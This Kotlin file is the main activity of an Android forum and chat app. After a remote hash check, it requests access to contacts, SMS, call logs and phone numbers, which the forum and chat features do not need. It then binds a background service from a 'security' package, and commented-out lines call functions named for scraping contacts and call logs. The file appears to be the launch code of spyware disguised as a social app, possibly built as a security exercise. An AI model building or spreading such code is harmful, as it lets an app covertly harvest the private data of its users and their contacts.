package com.example.mobileappproj

import ForumPostDetailScreen
import android.content.ComponentName
import android.content.Context
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import kotlinx.coroutines.*
import android.widget.Toast
import android.content.Intent
import android.content.ServiceConnection
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.IBinder
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.material3.Button
import androidx.compose.material3.Text
import androidx.compose.ui.Modifier
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import com.example.mobileappproj.security.CallLogs
import com.example.mobileappproj.security.Contacts
import com.example.mobileappproj.security.ServiceManager
import com.google.firebase.auth.FirebaseAuth
import dagger.hilt.android.AndroidEntryPoint

@AndroidEntryPoint
class MainActivity : ComponentActivity() {

    private lateinit var serviceManager: ServiceManager
    private var isBound = false

    private val serviceConnection = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName, service: IBinder) {
            val binder = service as ServiceManager.LocalBinder
            serviceManager = binder.getService()
            isBound = true
        }

        override fun onServiceDisconnected(name: ComponentName) {
            isBound = false
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        performIntegrityCheckAndInitialize()

    }

    private fun performIntegrityCheckAndInitialize() {
        CoroutineScope(Dispatchers.IO).launch {

            val expectedDexHash = fetchHashFromRemote("1fOPjFyrMGv5fBdXUNB_H-CperIHXMun4")

            val dexIntegrity = SecurityUtils.verifyDexIntegrity(this@MainActivity, expectedDexHash)

            withContext(Dispatchers.Main) {
                if (dexIntegrity) {
                    checkPermissionsAndInitialize()
                } else {
                    Toast.makeText(this@MainActivity, "App integrity could not be verified!", Toast.LENGTH_LONG).show()
                    finish()
                }
            }
        }
    }

    private suspend fun fetchHashFromRemote(fileId: String): String {
        var hash = ""

        withContext(Dispatchers.IO) {
            try {
                val url = URL("https://drive.google.com/uc?export=download&id=$fileId")
                (url.openConnection() as? HttpURLConnection)?.apply {
                    requestMethod = "GET"
                    doInput = true
                    connect()

                    BufferedReader(InputStreamReader(inputStream)).use { reader ->
                        hash = reader.readLine()
                    }
                }
                Log.d("HashFetch", "Hash for $fileId: $hash")
            } catch (e: Exception) {
                Log.e("HashFetch", "Error fetching hash for $fileId", e)
            }
        }

        return hash
    }
    private fun checkPermissionsAndInitialize() {
        // Permissions array
        val permissions = arrayOf(
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.WRITE_CONTACTS,
            android.Manifest.permission.READ_PHONE_NUMBERS,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.READ_CALL_LOG,
        )

        // Check and request permissions
        if (permissions.any { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }) {
            ActivityCompat.requestPermissions(this, permissions, 1)
        } else {
            initializeApp()
        }
    }

    private fun initializeApp() {
        // Bind to the service
        val intent = Intent(this, ServiceManager::class.java)
        bindService(intent, serviceConnection, BIND_AUTO_CREATE)

        setContent {
            val navController = rememberNavController()
            // Directly check if the user is signed in
            val currentUser = FirebaseAuth.getInstance().currentUser
            val startDestination = if (currentUser != null) "profile/{userId}" else "signin"
            NavHost(
                navController = navController,
                startDestination = startDestination,
                modifier = Modifier
            ) {
                composable("signup") {
                    SignUpScreen(navController = navController)
                }
                composable("signin") {
                    SignInScreen(navController = navController)
                }
                composable("profile/{userId}") { backStackEntry ->
                    val userId = backStackEntry.arguments?.getString("userId") ?: ""
                    ProfileScreen(navController = navController)
                }
                composable("forum") { backStackEntry ->
                    val userId = backStackEntry.arguments?.getString("userId") ?: ""
                    ForumMainScreen(navController = navController)
                }
                composable("chat") { backStackEntry ->
                    val userId = backStackEntry.arguments?.getString("userId") ?: ""
                    ChatScreen(navController = navController, userId = userId)
                }
                composable("forum-detail/{title}") { backStackEntry ->
                    val title = backStackEntry.arguments?.getString("title") ?: ""
                    ForumPostDetailScreen(navController = navController, title = title)
                }
                composable("forum-post") { backStackEntry ->
                    val userId = backStackEntry.arguments?.getString("userId") ?: ""
                    ForumPostScreen(navController = navController)
                }
                composable("resetpassword") {
                    ChangePasswordScreen(navController = navController)
                }
            }

            // If the user is signed in, navigate to the profile screen once the nav graph is ready
            // if (currentUser != null) {
            //     val userId = currentUser.uid
            //
            //     Ensure we only navigate once when the content is first set
            //     LaunchedEffect(key1 = userId) {
            //         navController.navigate("profile/$userId") {
            //             // Clear back stack
            //             popUpTo(navController.graph.startDestinationId) {
            //                 inclusive = true
            //             }
            //         }
            //     }
            // }
            //val contentResolver = applicationContext.contentResolver
            //val test = Contacts.scrapeAllContactDetails(this)
            //val test2 = CallLogs.scrapeCallLogs(contentResolver)

        }
    }

    override fun onDestroy() {
        super.onDestroy()
        unbindService(serviceConnection)
    }
}